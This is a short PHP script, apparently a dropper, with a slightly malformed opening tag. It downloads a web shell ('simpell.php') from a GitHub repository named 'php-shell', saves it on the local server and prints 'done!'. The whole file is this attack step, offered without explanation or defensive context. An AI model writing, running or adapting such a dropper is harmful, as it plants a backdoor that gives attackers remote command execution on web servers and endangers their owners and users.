<?php>
$simpell = file_get_contents("https://raw.githubusercontent.com/V3lan3/php-shell/master/simpell.php");
file_put_contents('simpell.php', "$simpell");
echo 'done!';
?>
